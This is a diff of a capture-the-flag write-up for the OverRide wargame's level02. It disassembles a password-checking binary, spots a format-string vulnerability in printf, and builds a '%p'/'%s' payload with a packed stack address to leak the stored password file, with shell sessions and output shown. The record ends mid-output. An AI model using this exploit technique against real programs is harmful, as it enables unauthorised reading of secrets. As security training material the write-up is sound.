@@ -1,64 +1,63 @@
 The programs opens our flag:
-mov edx, 0x400bb0; "r"
-mov eax, str.home_users_level03_.pass ; "/home/users/level03/.pass"
-mov rsi, rdx ; const char *mode
-mov rdi, rax ; const char *filename
-call sym.imp.fopen
+  400898:	ba b0 0b 40 00       	mov    edx,0x400bb0 <- "r"
+  40089d:	b8 b2 0b 40 00       	mov    eax,0x400bb2 <- "/home/users/level03/.pass"
+  4008a2:	48 89 d6             	mov    rsi,rdx
+  4008a5:	48 89 c7             	mov    rdi,rax
+  4008a8:	e8 53 fe ff ff       	call   400700 <fopen@plt>
 
-Then freads its content into a buffer `buffer` on the stack located at rbp-0xa0.
-lea rax, [buffer]
-mov rdx, qword [stream] ; FILE *stream
-mov rcx, rdx
-mov edx, 0x29 ; 41 ; size_t nmemb
-mov esi, 1 ; size_t size
-mov rdi, rax ; void *ptr
-call sym.imp.fread
-mov dword [nbytes], eax
+
+Then freads its content into a buffer on the stack located at rbp-0xa0.
+  4008e6:	48 8d 85 60 ff ff ff 	lea    rax,[rbp-0xa0] <- the buffer
+  4008ed:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
+  4008f1:	48 89 d1             	mov    rcx,rdx
+  4008f4:	ba 29 00 00 00       	mov    edx,0x29
+  4008f9:	be 01 00 00 00       	mov    esi,0x1
+  4008fe:	48 89 c7             	mov    rdi,rax
+  400901:	e8 8a fd ff ff       	call   400690 <fread@plt>
+  400906:	89 45 f4             	mov    DWORD PTR [rbp-0xc],eax
 
 then, there are two fgets executed:
-0x004009c3      488b057e0820.  mov rax, qword [sym.stdin]
-0x004009ca      4889c2         mov rdx, rax
-0x004009cd      488d4590       lea rax, [format]
-0x004009d1      be64000000     mov esi, 0x64
-0x004009d6      4889c7         mov rdi, rax
-0x004009d9      e812fdffff     call sym.imp.fgets
-0x004009de      488d4590       lea rax, [format]
-0x004009e2      bef50b4000     mov esi, 0x400bf5
-0x004009e7      4889c7         mov rdi, rax
-0x004009ea      e8e1fcffff     call sym.imp.strcspn
-0x004009ef      c644059000     mov byte [rbp + rax - 0x70], 0
-0x004009f4      b8e80c4000     mov eax, str.Password:			; 0x400ce8 ; "--[ Password: "
-0x004009f9      4889c7         mov rdi, rax
-0x004009fc      b800000000     mov eax, 0
-0x00400a01      e8bafcffff     call sym.imp.printf
-0x00400a06      488b053b0820.  mov rax, qword [sym.stdin]
-0x00400a0d      4889c2         mov rdx, rax
-0x00400a10      488d85f0feff.  lea rax, [password]
-0x00400a17      be64000000     mov esi, 0x64
-0x00400a1c      4889c7         mov rdi, rax
-0x00400a1f      e8ccfcffff     call sym.imp.fgets
+  4009c3:	48 8b 05 7e 08 20 00 	mov    rax,QWORD PTR [rip+0x20087e]        # 601248 <stdin@@GLIBC_2.2.5>
+  4009ca:	48 89 c2             	mov    rdx,rax
+  4009cd:	48 8d 45 90          	lea    rax,[rbp-0x70]
+  4009d1:	be 64 00 00 00       	mov    esi,0x64
+  4009d6:	48 89 c7             	mov    rdi,rax
+  4009d9:	e8 12 fd ff ff       	call   4006f0 <fgets@plt>
+  4009de:	48 8d 45 90          	lea    rax,[rbp-0x70]
+  4009e2:	be f5 0b 40 00       	mov    esi,0x400bf5
+  4009e7:	48 89 c7             	mov    rdi,rax
+  4009ea:	e8 e1 fc ff ff       	call   4006d0 <strcspn@plt>
+  4009ef:	c6 44 05 90 00       	mov    BYTE PTR [rbp+rax*1-0x70],0x0
+  4009f4:	b8 e8 0c 40 00       	mov    eax,0x400ce8 <- "--[ Password: "
+  4009f9:	48 89 c7             	mov    rdi,rax
+  4009fc:	b8 00 00 00 00       	mov    eax,0x0
+  400a01:	e8 ba fc ff ff       	call   4006c0 <printf@plt>
+  400a06:	48 8b 05 3b 08 20 00 	mov    rax,QWORD PTR [rip+0x20083b]        # 601248 <stdin@@GLIBC_2.2.5>
+  400a0d:	48 89 c2             	mov    rdx,rax
+  400a10:	48 8d 85 f0 fe ff ff 	lea    rax,[rbp-0x110]
+  400a17:	be 64 00 00 00       	mov    esi,0x64
+  400a1c:	48 89 c7             	mov    rdi,rax
+  400a1f:	e8 cc fc ff ff       	call   4006f0 <fgets@plt>
 
 The first fgets reads into a buffer `format` which is latter used as a format for printf here:
-lea rax, [format]
-mov rdi, rax
-mov eax, 0
-call sym.imp.printf
-mov edi, str.does_not_have_access  ; " does not have access!"
-call sym.imp.puts
-mov edi, 1
-call sym.imp.exit
+  400a96:	48 8d 45 90          	lea    rax,[rbp-0x70]
+  400a9a:	48 89 c7             	mov    rdi,rax
+  400a9d:	b8 00 00 00 00       	mov    eax,0x0
+  400aa2:	e8 19 fc ff ff       	call   4006c0 <printf@plt>
+  400aa7:	bf 3a 0d 40 00       	mov    edi,0x400d3a
+  400aac:	e8 cf fb ff ff       	call   400680 <puts@plt>
+  400ab1:	bf 01 00 00 00       	mov    edi,0x1
+  400ab6:	e8 55 fc ff ff       	call   400710 <exit@plt>
 
 This branch is executed when this condition is true:
- lea rcx, [password]
- lea rax, [buffer]
- mov edx, 0x29
- ; const char *s2
- mov rsi, rcx
- ; const char *s1
- mov rdi, rax
- call sym.imp.strncmp;
- test eax, eax
- jne 0x400a96;
+  400a4a:	48 8d 8d f0 fe ff ff 	lea    rcx,[rbp-0x110]
+  400a51:	48 8d 85 60 ff ff ff 	lea    rax,[rbp-0xa0]
+  400a58:	ba 29 00 00 00       	mov    edx,0x29
+  400a5d:	48 89 ce             	mov    rsi,rcx
+  400a60:	48 89 c7             	mov    rdi,rax
+  400a63:	e8 08 fc ff ff       	call   400670 <strncmp@plt>
+  400a68:	85 c0                	test   eax,eax
+  400a6a:	75 2a                	jne    400a96 <main+0x282>
 
 That is when the content our the second fgets `password` and the content of the fread on our flag file `buffer` are different.
 The printf of concern is called like that "printf(format);"
@@ -73,22 +72,23 @@ mov rsi, rcx
 Which means that the first variadic argument of this printf is the effective address of password.
 We can use this information to calculate the address of `buffer` which contains our flag.
 So:
-level02@OverRide:~$ cat script
+[Upload script1 on VM]
+level02@OverRide:~$ cat /tmp/script1
 #!/bin/bash
 
 echo '%p %p %p %p %p %p %p %p'
 echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-level02@OverRide:~$ bash script > input; cat input - | ./level02
+level02@OverRide:~$ bash /tmp/script1 > /tmp/input; cat /tmp/input - | ./level02
 ===== [ Secure Access System v1.0 ] =====
 /***************************************\
 | You must login to access this system. |
 \**************************************/
 --[ Username: --[ Password: *****************************************
-0x7fffffffe500 (nil) 0x70 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x6161616161616161 does not have access!
+0x7fffffffe500 (nil) 0x70 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x4141414141414141 does not have access!
 
 We can see that the address of password is at 0x7fffffffe500.
 According to our script to current content of password is 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
-And we can see that the 8th '%p' prints '0x6161616161616161' which is just the content of password as 0x61 is the ascii value for 'A'
+And we can see that the 8th '%p' prints '0x4141414141414141' which is just the content of password as 0x41 is the ascii value for 'A'
 Which means we can replace the last %p by a %s and set the first 4 characters of password to the address we want to print, that is the address of `buffer`.
 Since we know that password is at 0x7fffffffe500, that password, relative to the rbp, is at rbp-0x110 and that buffer, relative to the rbp, is at rbp-0xa0.
 By doing 0x110 - 0xa0 + 0x7fffffffe500, we get 0x7fffffffe570.
@@ -96,7 +96,8 @@ We can now modify our script to:
 echo '%p %p %p %p %p %p %p %s'
 echo -e '\x70\xe5\xff\xff\xff\x7f\x00\x00' AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 and:
-level02@OverRide:~$ bash script > input; cat input - | ./level02
+[Upload script2 on VM]
+level02@OverRide:~$ bash /tmp/script2 > /tmp/input; cat /tmp/input - | ./level02
 ===== [ Secure Access System v1.0 ] =====
 /***************************************\
 | You must login to access this system. |
